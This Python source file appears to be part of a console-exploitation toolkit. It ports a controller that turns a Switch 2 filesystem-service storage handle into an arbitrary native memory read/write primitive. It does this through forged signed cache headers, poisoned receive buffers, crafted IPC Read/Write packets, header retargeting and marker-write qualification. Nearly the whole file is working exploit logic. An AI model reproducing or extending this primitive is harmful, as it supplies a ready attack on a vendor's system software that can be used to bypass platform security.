"""Port of ns2jb's fs-memory-control.cjs controller core (pass-5-corrected model).

Faithful port of the controller logic (select/readBlock/read/writeAt/
qualifySignedHeader/qualifySingleBucket) onto the CivSwitch console
primitives. What is NOT ported (runner plumbing, not controller logic):
the socket server, run-control integration, source-file hashing, and the
retained-/root- dispatch branches.

Primitive mapping (cjs -> Civ):
  s.call('memset', out, poison, n)   -> console "write" of poison bytes into a
                                        reusable rx region (pass-5 rx_page fix)
  s.ipc(..., cmd, payload, descs)    -> console "send" + parse_reply
  s.readOwned / bulk.read            -> console "read" chunked at read_chunk
                                        (the proven leak_read per-call size)
  copyField(bytes, label)            -> injected callable (P2: worker-wave
                                        cache-alias writes; refuses until wired)
  retained.storages[0]               -> control_handle ctor arg (Open item:
                                        which Civ handle plays this role)

Conceptual model (handoff §43): the candidate handle's storage reads clean
RomFS until the alias chain primes it. This controller stages the cjs order
exactly and every read distinguishes itself from ordinary content before it
is trusted. One setup per payload is the harness rule — the caller opens the
candidate handle once and keeps it.

All arithmetic mirrors the .cjs byte-for-byte, including Python floor
division standing in for Math.floor (identical for negative operands).
"""

import hashlib
import json
import time
from pathlib import Path

from signed_cache_plan import plan as plan_header


class CheckError(ValueError):
    """The cjs check() helper: fail fast with the message."""


def _check(condition, message):
    if not condition:
        raise CheckError(message)


def _describe_plan(plan):
    return {"target": plan["target"], "base": plan["base"],
            "entryOffset": plan["entryOffset"], "readOffset": plan["readOffset"],
            "addressBias": plan["addressBias"], "encoding": plan["encoding"],
            "header": plan["bytes"].hex(),
            "headerFormat": plan.get("headerFormat")}


def _now_iso():
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


class FsMemoryControl:
    def __init__(self, console, mod, *, candidate_handle, storage_size,
                 initial_plan, input_addr, copy_field=None, control_handle=None,
                 output_poison=0xA5, label="memctl", on_state=None,
                 read_chunk=0x4000, cycle=0x500000):
        _check(initial_plan.get("encoding") == "signed-one-shot",
               "Expected the Switch 2 signed cache header")
        self.console = console
        self.mod = mod                      # host module: packet/u64/parse_reply
        self.candidate_handle = candidate_handle
        self.control_handle = control_handle
        self.storage_size = storage_size
        self.input_addr = input_addr
        self.copy_field = copy_field
        self.output_poison = output_poison
        self.label = label
        self.on_state = on_state
        self.read_chunk = read_chunk
        self.cycle = cycle                  # Open item: Civ's measured bucketPeriod
        self.active_plan = initial_plan
        self.known_ranges = [[initial_plan["target"], initial_plan["target"] + 0x4000]]
        self.serial = 0
        self.allow_retarget = False
        self.force_retarget = False
        self.rx_base = None                 # reusable poisoned receive region
        self.rx_size = 0
        self.runs = Path(mod.RUNS) if mod is not None and hasattr(mod, "RUNS") \
            else Path(__file__).with_name("runs")
        self.state = {"phase": "bootstrap", "steadyStateReliable": False,
                      "operations": [], "plan": _describe_plan(initial_plan)}

    # ------------------------------------------------------------- state ----

    def _save(self):
        if self.on_state is not None:
            self.on_state(json.loads(json.dumps(self.state)))

    def _remember_range(self, address, length):
        ranges = self.known_ranges
        ranges.append([address, address + length])
        ranges.sort(key=lambda pair: pair[0])
        i = 1
        while i < len(ranges):
            previous, current = ranges[i - 1], ranges[i]
            if current[0] <= previous[1]:
                previous[1] = max(previous[1], current[1])
                del ranges[i]
            else:
                i += 1

    def _range_known(self, address, length):
        return any(begin <= address and address + length <= end
                   for begin, end in self.known_ranges)

    # -------------------------------------------------------- primitives ----

    def _ensure_rx(self, length):
        """One reusable receive region, grown only when a longer read arrives
        (the pass-5 fix: per-block allocs leaked 16 KB each)."""
        if self.rx_base is None or length > self.rx_size:
            pages = (length + 0xFFF) // 0x1000
            self.rx_base = self.console.request("alloc", pages=pages)["address"]
            self.rx_size = pages * 0x1000
        return self.rx_base

    def _write(self, address, data):
        """console.js::readFrame caps a request frame at 0x8000 JSON bytes and a raw hex
        write doubles the byte count (a 0x4000-byte fill is already 0x8000 characters), so
        fills and writes must be split. 0x1000 bytes -> 0x2000 hex characters per call."""
        data = bytes(data)
        for at in range(0, len(data), 0x1000):
            self.console.request("write", address=address + at,
                                 hex=data[at:at + 0x1000].hex())

    def _console_read(self, address, length):
        out = bytearray()
        for at in range(0, length, self.read_chunk):
            size = min(self.read_chunk, length - at)
            out += bytes.fromhex(
                self.console.request("read", address=address + at, length=size)["hex"])
        return bytes(out)

    def _ipc(self, handle, command, payload, *, receive=None, send=None):
        packet = self.mod.packet(command, payload,
                                 receive=receive or (), send=send or ())
        raw = self.console.request("send", handle=handle, packet=packet.hex())
        _check(hasattr(self.mod, "parse_reply"),
               "The injected module must provide parse_reply")
        reply = self.mod.parse_reply(bytes.fromhex(raw["hex"]))
        if "canonicalResult" not in reply:
            # parse_reply exposes the CMIF-canonical result as "canonical"; "result" is the raw
            # value. Falling back to "result" silently used the wrong field (review point 4.3).
            reply["canonicalResult"] = reply.get("canonical", reply.get("result"))
        return reply

    def _poisoned_read(self, handle, offset, length, poison):
        """readStorage (probe-reserved-gap.cjs:567): poison the receive buffer,
        IPC Read (command 0), read the buffer back. A real copy overwrites the
        poison; a successful call that leaves it untouched is distinguishable
        (the pass-5 all-poison detector)."""
        rx = self._ensure_rx(length)
        self._write(rx, bytes([poison]) * length)
        reply = self._ipc(handle, 0, self.mod.u64(offset) + self.mod.u64(length),
                          receive=[{"address": rx, "size": length, "mode": 1}])
        if reply.get("result"):
            return {"result": reply.get("canonicalResult"), "bytes": None}
        data = self._console_read(rx, length)
        if data == bytes([poison]) * length:
            return {"result": "all-poison", "bytes": None}  # DMA never landed
        return {"result": 0, "bytes": data}

    def _copy_field(self, payload, name):
        _check(self.copy_field is not None,
               "copyField wave machinery is not wired yet (P2); "
               "retarget/qualification writes are unavailable")
        return self.copy_field(payload, name)

    # ---------------------------------------------------- controller core ----

    def select(self, address, length):
        _check(isinstance(address, int) and 0x100000000 <= address
               and address + length < 2 ** 39,
               "Memory address is outside the qualified width")
        plan = self.active_plan
        offset = address - plan["addressBias"]
        # A read may extend past its starting block, as the native proof showed.
        aligned = (offset // 0x4000) * 0x4000
        hits = (offset >= 0 and aligned >= int(plan["entryOffset"])
                and offset + length <= self.storage_size
                and aligned % self.cycle == 0)
        if not hits or self.force_retarget:
            _check(self.allow_retarget,
                   "Address needs a new header; retargeting remains unqualified "
                   "and requires retarget:true")
            nxt = plan_header(address, self.storage_size, self.cycle)
            _check(nxt["readOffset"] + length <= self.storage_size,
                   "Memory window exceeds the storage request limit")
            self.state["pending"] = {"operation": "retarget", **_describe_plan(nxt)}
            self._save()
            for step in nxt["writes"]:
                self._copy_field(step["bytes"],
                                 "retarget-%d-%d" % (self.serial + 1, step["end"]))
            self.active_plan = nxt
            self.force_retarget = False
            self.state["plan"] = _describe_plan(nxt)
            self.state.pop("pending", None)
            self._save()
            offset = nxt["readOffset"]
        return offset

    def read_block(self, address, length):
        offset = self.select(address, length)
        rx = self._ensure_rx(length)
        self.state["nativeRequest"] = {"stage": "poison", "address": address,
                                       "offset": offset, "length": length}
        self._save()
        self._write(rx, bytes([0xA5]) * length)
        self.state["nativeRequest"]["stage"] = "ipc"
        self._save()
        reply = self._ipc(self.candidate_handle, 0,
                          self.mod.u64(offset) + self.mod.u64(length),
                          receive=[{"address": rx, "size": length, "mode": 1}])
        self.state["nativeRequest"]["stage"] = "download"
        self.state["nativeRequest"]["result"] = reply.get("canonicalResult")
        self._save()
        data = self._console_read(rx, length)
        if reply.get("result"):
            self.runs.mkdir(exist_ok=True)
            failed = self.runs / ("%s-failed-read-%d.bin"
                                  % (self.label, int(time.time() * 1000)))
            failed.write_bytes(data)
            self.state["failedRead"] = {"address": address, "offset": offset,
                                        "length": length,
                                        "result": reply.get("canonicalResult"),
                                        "rawResult": reply.get("result"),
                                        "outputFile": str(failed),
                                        "changedBytes": sum(b != 0xA5 for b in data)}
            self._save()
            error = CheckError("FS memory read returned 0x%x"
                               % reply.get("canonicalResult"))
            error.nativeResult = reply.get("canonicalResult")
            raise error
        if data == bytes([0xA5]) * length:
            raise CheckError("FS memory read did not DMA (all poison)")
        self.state.pop("nativeRequest", None)
        self._remember_range(address, length)
        return data

    def read(self, address, length):
        _check(isinstance(length, int) and 0 < length <= 0x600000,
               "Read length must be 1..6 MiB")
        # Stay below the observed large-read failure. With a qualified smaller
        # period, each chunk starts in the same cache bucket as the previous one.
        cycle = self.cycle
        step = (0x40000 // cycle) * cycle if cycle <= 0x40000 else 0x40000
        parts = []
        try:
            at = 0
            while at < length:
                current = address + at
                offset = current - self.active_plan["addressBias"]
                start = (offset // cycle) * cycle
                prefix = offset - start
                # Read an overlapping qualified window when the requested address
                # is in another bucket. Slice locally instead of rebuilding.
                direct = ((offset // 0x4000) * 0x4000) % cycle == 0
                prefix_known = any(begin <= current - prefix and current <= end
                                   for begin, end in self.known_ranges)
                overlap = (not self.force_retarget and not direct and prefix_known
                           and cycle <= 0x40000 and start >= 0
                           and start >= int(self.active_plan["entryOffset"])
                           and start + cycle <= self.storage_size)
                size = min(cycle - prefix if overlap else step, length - at)
                data = self.read_block(current - prefix if overlap else current,
                                       prefix + size if overlap else size)
                parts.append(data[prefix:] if overlap else data)
                at += size
        except Exception:
            if parts:
                data = b"".join(parts)
                self.runs.mkdir(exist_ok=True)
                partial = self.runs / ("%s-memory-%d-partial-%d.bin"
                                       % (self.label, self.serial,
                                          int(time.time() * 1000)))
                partial.write_bytes(data)
                self.state["partialRead"] = {"operation": self.serial,
                                             "address": address,
                                             "length": len(data),
                                             "outputFile": str(partial),
                                             "sha256": hashlib.sha256(data).hexdigest()}
                self._save()
            raise
        return b"".join(parts)

    def write_at(self, address, data):
        offset = self.select(address, len(data))
        _check(offset % 0x4000 != 0 or len(data) < 0x8000,
               "An aligned large write may bypass the controlled cache")
        self._write(self.input_addr, data)
        reply = self._ipc(self.candidate_handle, 1,
                          self.mod.u64(offset) + self.mod.u64(len(data)),
                          send=[{"address": self.input_addr,
                                 "size": len(data), "mode": 1}])
        _check(not reply.get("result"),
               "FS memory write failed: 0x%x" % reply.get("canonicalResult"))

    # ------------------------------------------------------ qualification ----

    def qualify_signed_header(self, address):
        length, marker_offset = 0x4000, 0x108
        _check(isinstance(address, int) and address % length == 0
               and self._range_known(address, length),
               "Signed-header qualification needs a previously read, aligned native block")
        nxt = plan_header(address, self.storage_size, self.cycle)
        _check(self.control_handle is not None
               and self.control_handle != self.candidate_handle,
               "Ordinary content control unavailable")
        ordinary = self._poisoned_read(self.control_handle, nxt["readOffset"], length,
                                       self.output_poison)
        _check(not ordinary["result"], "Ordinary signed-offset control failed")
        self.allow_retarget = self.force_retarget = False
        before = self.read(address, length)
        _check(before != ordinary["bytes"],
               "Memory and ordinary content do not distinguish the mapping")
        self.serial += 1
        entry = {"id": self.serial, "at": _now_iso(),
                 "command": "qualify-signed-header", "address": address,
                 "length": length, "plan": _describe_plan(nxt),
                 "beforeSha256": hashlib.sha256(before).hexdigest(),
                 "ordinarySha256": hashlib.sha256(ordinary["bytes"]).hexdigest(),
                 "previousPlan": self.state["plan"]}
        self.state["operations"].append(entry)
        self.state["currentOperation"] = entry["id"]
        self.runs.mkdir(exist_ok=True)
        entry["beforeFile"] = str(self.runs / ("%s-signed-before-%d.bin"
                                               % (self.label, entry["id"])))
        Path(entry["beforeFile"]).write_bytes(before)
        self.state["pending"] = {"operation": "qualify-signed-header",
                                 **_describe_plan(nxt)}
        self._save()
        attempts = self._copy_field(nxt["writes"][0]["bytes"],
                                    "qualify-signed-header-%d" % entry["id"])
        entry["copyAttempts"] = attempts if isinstance(attempts, int) else 0
        self.active_plan = nxt
        self.state["plan"] = _describe_plan(nxt)
        self._save()
        first = self._poisoned_read(self.candidate_handle, nxt["readOffset"], length, 0xA5)
        second = self._poisoned_read(self.candidate_handle, nxt["readOffset"], length, 0x5A)
        entry["readResults"] = [first["result"], second["result"]]
        entry["readVerified"] = (not first["result"] and not second["result"]
                                 and first["bytes"] == before
                                 and second["bytes"] == before)
        self._save()
        _check(entry["readVerified"],
               "Signed-header reads differ from the captured native block")
        marker = bytes.fromhex("5349474e45442d525700ffcc1122aa6633")
        expected = bytearray(before)
        expected[marker_offset:marker_offset + len(marker)] = marker
        entry["pending"] = True
        self._save()
        try:
            self.write_at(address + marker_offset, marker)
            changed = self.read(address, length)
            entry["writeVerified"] = changed == bytes(expected)
            entry["changedSha256"] = hashlib.sha256(changed).hexdigest()
            _check(entry["writeVerified"], "Signed-header write or surrounding bytes differ")
        finally:
            self.write_at(address + marker_offset,
                          before[marker_offset:marker_offset + len(marker)])
            restored = self.read(address, length)
            entry["restored"] = restored == before
            entry["restoredSha256"] = hashlib.sha256(restored).hexdigest()
            self._save()
            _check(entry["restored"],
                   "Signed-header restoration differs from the entire original block")
        entry.pop("pending", None)
        self.state.pop("pending", None)
        self.state.pop("currentOperation", None)
        self.state["signedHeaderQualified"] = True
        self._save()
        return entry

    def qualify_single_bucket(self, address, expected_hex):
        # Verifies a prior, separately checked bucket-count write against
        # captured native bytes. Does not change FS metadata itself.
        _check(self.cycle == 0x28000, "The original ten-bucket period is required")
        _check(isinstance(expected_hex, str) and len(expected_hex) % 2 == 0
               and 32 <= len(expected_hex) <= 128
               and all(c in "0123456789abcdefABCDEF" for c in expected_hex),
               "Expected 16..64 native bytes are required")
        expected = bytes.fromhex(expected_hex)
        offset = address - self.active_plan["addressBias"]
        _check(self._range_known(address, len(expected)),
               "Qualification address has not previously been read")
        _check(offset >= 0 and offset + len(expected) <= self.storage_size
               and ((offset // 0x4000) * 0x4000) % self.cycle != 0,
               "Qualification must use a formerly different bucket")
        _check(self.control_handle is not None
               and self.control_handle != self.candidate_handle,
               "The ordinary storage control is unavailable")
        ordinary = self._poisoned_read(self.control_handle, offset, len(expected),
                                       self.output_poison)
        _check(not ordinary["result"] and ordinary["bytes"] != expected,
               "Ordinary file content does not distinguish this address")
        first = self._poisoned_read(self.candidate_handle, offset, len(expected), 0xA5)
        second = self._poisoned_read(self.candidate_handle, offset, len(expected), 0x5A)
        proof = self.state["singleBucketQualification"] = {
            "address": address, "offset": offset, "expectedHex": expected_hex,
            "ordinaryHex": ordinary["bytes"].hex(),
            "results": [first["result"], second["result"]],
            "observedHex": [(first["bytes"] or b"").hex(),
                            (second["bytes"] or b"").hex()],
            "verified": (not first["result"] and not second["result"]
                         and first["bytes"] == expected
                         and second["bytes"] == expected)}
        self._save()
        _check(proof["verified"],
               "Single-bucket behavior did not match captured native memory")
        self.cycle = self.state["bucketPeriod"] = 0x4000
        self._save()
        return {"bucketPeriod": self.cycle, **proof}

    # ------------------------------------------------------------ dispatch ----

    def dispatch(self, request):
        command = request.get("command")
        if command == "info":
            return {"ready": True, "plan": self.state["plan"],
                    "bucketPeriod": self.cycle, "phase": self.state["phase"],
                    "steadyStateReliable": self.state["steadyStateReliable"],
                    "lastError": self.state.get("error"),
                    "signedHeaderQualified": self.state.get("signedHeaderQualified", False)}
        if command == "retire":
            return {"retiring": True}
        if (isinstance(command, str)
                and (command.startswith("root-") or command.startswith("retained-"))):
            raise CheckError("%s dispatch is runner plumbing; not ported" % command)
        if command == "qualify-signed-header":
            return self.qualify_signed_header(
                request.get("address", self.active_plan["target"]))
        if command == "qualify-single-bucket":
            return self.qualify_single_bucket(request["address"], request["expectedHex"])
        if command not in ("select", "read", "write"):
            raise CheckError("Unknown memory command %r" % (command,))
        self.allow_retarget = request.get("retarget") is True
        self.force_retarget = request.get("forceRetarget") is True
        _check(not self.force_retarget or self.allow_retarget,
               "Forced retargeting also requires retarget:true")
        address = int(request["address"])
        self.serial += 1
        entry = {"id": self.serial, "at": _now_iso(), "command": command,
                 "address": address, "forceRetarget": self.force_retarget}
        self.state["operations"].append(entry)
        self.state["currentOperation"] = entry["id"]
        self._save()
        try:
            if command == "select":
                _check(self.allow_retarget, "Header selection requires retarget:true")
                self.select(address, 1)
                entry["plan"] = self.state["plan"]
                entry["nativeAddressVerified"] = False
            elif command == "read":
                entry["length"] = int(request["length"])
                self._save()
                data = self.read(address, entry["length"])
                entry["length"] = len(data)
                self.runs.mkdir(exist_ok=True)
                output = self.runs / ("%s-memory-%d.bin" % (self.label, entry["id"]))
                output.write_bytes(data)
                entry["outputFile"] = str(output)
                entry["sha256"] = hashlib.sha256(data).hexdigest()
                entry["first64Hex"] = data[:64].hex()
            else:
                hex_text = request.get("hex", "")
                _check(isinstance(hex_text, str) and len(hex_text) % 2 == 0
                       and bool(hex_text)
                       and all(c in "0123456789abcdefABCDEF" for c in hex_text),
                       "Invalid write bytes")
                data = bytes.fromhex(hex_text)
                expected_hex = request.get("expectedHex")
                _check(len(data) <= 0x10000 and isinstance(expected_hex, str)
                       and len(expected_hex) == len(data) * 2
                       and all(c in "0123456789abcdefABCDEF" for c in expected_hex),
                       "Writes need matching expected bytes and are limited to 64 KiB")
                before = self.read(address, len(data))
                _check(before == bytes.fromhex(expected_hex),
                       "The expected memory bytes differ")
                entry["length"] = len(data)
                self.runs.mkdir(exist_ok=True)
                entry["beforeFile"] = str(self.runs / ("%s-memory-%d-before.bin"
                                                       % (self.label, entry["id"])))
                Path(entry["beforeFile"]).write_bytes(before)
                entry["hex"] = data.hex()
                entry["expectedHex"] = before.hex()
                entry["pending"] = True
                self._save()
                try:
                    self.write_at(address, data)
                    _check(self.read(address, len(data)) == data,
                           "FS memory write readback differs")
                    entry["verified"] = True
                except Exception:
                    self.write_at(address, before)
                    entry["restored"] = self.read(address, len(before)) == before
                    _check(entry["restored"], "Failed write could not be restored")
                    raise
                entry.pop("pending", None)
        except Exception as error:
            entry["error"] = str(error)
            self.state["error"] = str(error)
            raise
        finally:
            self.state.pop("currentOperation", None)
            self._save()
        return entry

    def info(self):
        return self.dispatch({"command": "info"})
